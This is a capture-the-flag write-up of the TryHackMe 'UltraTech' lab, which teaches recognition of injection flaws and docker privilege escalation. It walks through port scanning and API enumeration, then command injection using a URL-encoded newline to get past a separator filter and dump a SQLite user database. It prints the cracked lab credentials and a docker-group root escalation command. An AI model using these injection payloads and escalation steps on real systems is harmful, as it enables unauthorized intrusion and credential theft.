# UltraTech - TryHackMe

Linux machine exposing FTP, SSH, a static company site on a non-standard Apache port, and a
Node.js Express API on another non-standard port. The API passes user input straight into a
system command, which leads to a SQLite database dump, cracked credentials, SSH access, and
privilege escalation through group membership in `docker`.

Target: `10.65.166.237`

---

## Reconnaissance

A default `nmap -sV -sC` misses the high ports entirely. A full port scan is needed:

```bash
nmap -sV -sC -Pn -p- 10.65.166.237
```

Four services: FTP (vsftpd 3.0.5, port 21, anonymous login not useful), SSH (OpenSSH 8.2p1,
port 22), a Node.js Express API on port 8081, and an Apache 2.4.41 site on port 31331.

---

## Enumeration

```bash
gobuster dir -u http://10.65.166.237:8081 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,zip
```

Two routes: `/auth` (200) and `/ping` (500). The site on port 31331 ships a minified
`app.min.js`, but it's purely cosmetic and never calls the API - the routes have to be
enumerated directly against the API, not inferred from the frontend.

A bare call to `/ping` returns a 500 with a stack trace:

```
TypeError: Cannot read property 'replace' of undefined at /home/www/api/index.js:45
```

The trace shows the route expects a parameter that gets passed to `.replace()`. Trying the
obvious candidate works:

```bash
curl "http://10.65.166.237:8081/ping?ip=10.65.166.237"
```

The response is the output of a real `ping` command, meaning the `ip` parameter reaches a
system shell.

---

## Exploitation - Command Injection

The classic separators (`;`, `|`, `&&`) are stripped by the route's `.replace()` call, but a
URL-encoded newline (`%0a`) gets through:

```
http://10.65.166.237:8081/ping?ip=10.65.166.237%0als%20-la
```

The response includes the output of `ls -la` on `/home/www/api`, listing `utech.db.sqlite`.
Reading the file the same way:

```
http://10.65.166.237:8081/ping?ip=10.65.166.237%0acat%20utech.db.sqlite
```

dumps a `users` table with `login`, `password`, and `type` columns. Both password values are
32-character hex strings - MD5 hashes, one for `r00t` and one for `admin`. A hash lookup
(crackstation) resolves both:

```
r00t:n100906
admin:mrsheafy
```

---

## Initial Access

The `r00t` application credentials are reused as the system account:

```bash
ssh r00t@10.65.166.237
```

---

## Privilege Escalation

Crontab and SUID binaries show nothing custom. The actual vector is group membership:

```bash
id
```

```
groups=1001(r00t),116(docker)
```

Membership in `docker` is enough to reach root, but the box has no internet access, so
`docker run alpine` fails to pull. Checking what's already cached locally works instead:

```bash
docker images
# bash:latest present
docker run -v /:/mnt --rm -it bash chroot /mnt /bin/sh
```

The host filesystem is mounted at `/mnt`, giving a root shell on the host.

---

## Key Takeaways

- An API's routes are enumerated against the API itself, not inferred from the frontend
  JavaScript - a cosmetic client that never calls certain endpoints says nothing about
  whether those endpoints exist.
- When common command injection separators (`;`, `|`, `&&`) are filtered, a URL-encoded
  newline (`%0a`) is worth trying - an incomplete `.replace()` filter can let it through.
- A stack trace in an application error is often the clearest sign that user input reaches
  a backend command or function - it's worth reading past the error itself.
- Group membership in `docker` is a privilege escalation path equivalent to `lxd`. Without
  internet access, `docker images` finds a locally cached image to run instead of pulling
  one.

---

## Disclaimer

This lab was completed in a controlled environment provided by TryHackMe. All actions were
performed strictly for educational purposes.
